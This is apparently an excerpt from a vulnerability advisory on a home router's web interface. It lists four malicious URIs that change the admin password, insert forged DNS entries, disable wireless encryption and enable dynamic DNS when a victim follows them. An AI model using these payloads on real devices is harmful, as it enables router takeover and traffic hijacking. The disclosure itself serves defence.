To exploit this issue, an attacker must entice an unsuspecting victim into following a malicious URI.

Reports indicate this issue is being actively exploited in the wild.

The following example URIs are available:

Set a password (NUEVOPASS):
http://192.168.1.254/xslt?PAGE=A05_POST&amp;THISPAGE=A05&amp;NEXTPAGE=A05_POST&amp;ENABLE_PASS=on&amp;PASSWORD=NUEVOPASS&amp;PASSWORD_CONF=NUEVOPASS

Add names to the DNS:
http://192.168.1.254/xslt?PAGE=J38_SET&amp;THISPAGE=J38&amp;NEXTPAGE=J38_SET&amp;NAME=www.example.com&amp;ADDR=127.0.0.1

Disable Wireless Authentication
http://192.168.1.254/xslt?PAGE=C05_POST&amp;THISPAGE=C05&amp;NEXTPAGE=C05_POST&amp;NAME=encrypt_enabled&amp;VALUE=0

Set Dynamic DNS
http://192.168.1.254/xslt?PAGE=J05_POST&amp;THISPAGE=J05&amp;NEXTPAGE=J05_POST&amp;IP_DYNAMIC=TRUE
